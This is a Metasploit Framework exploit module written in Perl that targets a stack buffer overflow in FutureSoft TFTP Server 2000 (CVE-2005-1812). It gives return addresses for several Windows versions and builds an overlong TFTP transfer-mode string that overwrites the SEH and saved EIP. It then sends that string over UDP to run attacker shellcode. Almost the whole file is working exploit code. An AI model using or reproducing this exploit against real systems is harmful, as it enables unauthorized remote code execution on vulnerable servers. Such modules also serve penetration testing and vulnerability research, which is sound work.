
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::futuresoft_tftpd;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };

my $info =
  {

	'Name'  => 'FutureSoft TFTP Server 2000 Buffer Overflow',
	'Version'  => '$Revision: 1.1 $',
	'Authors' => [ 'y0 [at] w00t-shell.net', ],
	'Arch'  => [ 'x86' ],
	'OS'    => [ 'win32', 'winnt', 'win2000', 'winxp', 'win2003' ],
	'Priv'  => 0,

	'AutoOpts' => { 'EXITFUNC' => 'process' },
	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 69],
		'SSL'   => [0, 'BOOL', 'Use SSL'],
	  },

	'Payload' =>
	  {
		'Space'     => 350,
		'BadChars'  => "\x00",
		'Prepend'   => "\x81\xc4\xff\xef\xff\xff\x44",
		'Keys'      => ['+ws2ord'],
	  },

	'Description'  => Pex::Text::Freeform(qq{
		This module exploits a stack overflow in the FutureSoft TFTP Server
	2000 product. By sending an overly long transfer-mode string, we were able
	to overwrite both the SEH and the saved EIP. A subsequent write-exception 
	that will occur allows the transferring of execution to our shellcode 
	via the overwritten SEH. This module has been tested against Windows
	2000 Professional and for some reason does not seem to work against 
	Windows 2000 Server (could not trigger the overflow at all).
}),

	'Refs'  =>
	  [
		['CVE', '2005-1812'],
		['BID', '13821'],
		['URL', 'http://www.security.org.sg/vuln/tftp2000-1001.html'],
	  ],

	'Targets' =>
	  [
		['Windows 2000 Pro English ALL',   0x75022ac4], # ws2help.dll
		['Windows XP Pro SP0/SP1 English', 0x71aa32ad], # ws2help.dll
		['Windows NT SP5/SP6a English',    0x776a1799], # ws2help.dll
		['Windows 2003 Server English',    0x7ffc0638], # PEB return
	  ],
	'Keys' => ['tftpd'],
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Exploit
{
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
	my $target = $self->Targets->[$target_idx];

	if (! $self->InitNops(128)) {
		$self->PrintLine("[*] Failed to initialize the nop module.");
		return;
	}

	my $splat = Pex::Text::AlphaNumText(142);

	my $sploit =
	  "\x00\x01". "metasploit.txt". "\x00". $splat.
	  "\xeb\x06". pack('V', $target->[1]).
	  $shellcode. "\x00";

	$self->PrintLine(sprintf("[*] Trying to exploit target %s w/ return 0x%.8x", $target->[0], $target->[1]));

	my $s = Msf::Socket::Udp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );
	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	$s->Send($sploit);
	$self->Handler($s);
	$s->Close();
	return;
}

